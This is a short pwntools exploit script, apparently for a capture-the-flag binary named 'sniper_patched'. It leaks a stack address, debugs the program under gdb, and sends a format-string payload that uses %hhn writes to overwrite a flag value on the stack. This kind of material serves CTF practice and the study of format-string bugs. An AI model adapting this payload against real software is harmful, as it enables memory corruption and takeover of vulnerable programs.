from pwn import *


binary = './sniper_patched'
libc = ELF('./libc.so.6')
p = process(binary)
s = '''
b * printf
b * vuln+103
'''

gdb.attach(p, s)


rdi = p.recvline().strip().decode()
rdi = int(rdi, 16)

print(hex(rdi))


flag_stack_pos = rdi + 40
 # Value without \xa0
payload = b"%10c%8$hhn%10$p-" # this %p prints 0x9f9f000, which is before the modification. 
payload += p64(flag_stack_pos+2)
payload += p64(0xa9f0000) 





p.sendline(payload)

p.interactive()
